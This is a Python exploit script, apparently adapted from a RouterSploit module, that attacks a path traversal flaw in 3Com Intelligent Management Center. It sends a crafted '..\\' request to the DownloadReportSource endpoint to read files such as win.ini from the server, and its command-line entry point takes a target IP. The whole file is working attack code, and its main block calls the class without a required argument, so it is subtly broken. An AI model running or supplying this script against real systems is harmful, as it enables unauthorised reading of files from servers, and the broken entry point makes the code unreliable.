target = ""
# rsf exploit module
# description: Exploits 3Com Intelligent Management Center path traversal vulnerability.
# If the target is vulnerable it is possible to read file from the filesystem.

import requests

class Exploit:
    __info__ = {
        "name": "3Com IMC Path Traversal",
        "description": "Exploits 3Com Intelligent Management Center path traversal vulnerability."
                       "If the target is vulnerable it is possible to read file from the filesystem.",
        "authors": (
            "Richard Brain",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/12679/",
        ),
        "devices": (
            "3Com Intelligent Management Center",
        ),
    }

    def __init__(self, target, port=8080, filename="\\windows\\win.ini"):
        self.target = target
        self.port = port
        self.filename = filename

    def run(self):
        if self.check():
            print("Target seems to be vulnerable")
            print("Sending payload request")
            path = f"/imc/report/DownloadReportSource?dirType=webapp&fileDir=reports&fileName=reportParaExample.xml..\\..\\..\\..\\..\\..\\..\\..\\..\\..{self.filename}"
            response = requests.get(f"http://{self.target}:{self.port}{path}")

            if response is None:
                return

            if response.status_code == 200 and len(response.text):
                print(f"Exploit success - reading {self.filename} file")
                print(response.text)
        else:
            print("Exploit failed - target seems to be not vulnerable")

    def check(self):
        response = requests.get(f"http://{self.target}:{self.port}/imc/report/DownloadReportSource?dirType=webapp&fileDir=reports&fileName=reportParaExample.xml..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini")
        if response is None:
            return False

        if response.status_code == 200 and "[fonts]" in response.text:
            return True  # target is vulnerable

        return False  # target is not vulnerable




import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
